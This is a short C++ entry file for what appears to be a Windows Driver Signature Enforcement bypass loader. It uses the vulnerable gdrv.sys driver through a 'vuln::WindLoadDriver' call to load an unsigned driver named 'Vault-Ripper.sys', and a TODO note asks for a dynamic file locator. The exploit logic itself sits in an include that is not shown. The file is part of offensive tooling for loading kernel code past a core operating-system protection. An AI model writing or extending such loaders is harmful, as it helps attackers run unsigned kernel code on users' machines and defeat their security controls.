#include "includes.h"

wchar_t LoaderName[] = L"gdrv.sys";  
wchar_t Driver_Name[] = L"Vault-Ripper.sys";

int main() {
	std::wcout << ( "[+] DSE Loader Entry Called!\n" );
	NTSTATUS stat = vuln::WindLoadDriver( LoaderName, Driver_Name, 0 );
	std::this_thread::sleep_for( std::chrono::milliseconds( 200 ) );
	system( "pause" );
	return 0;
}

// TODO
/*
 -> Dynamic file locator so they don have to be on the desktop

*/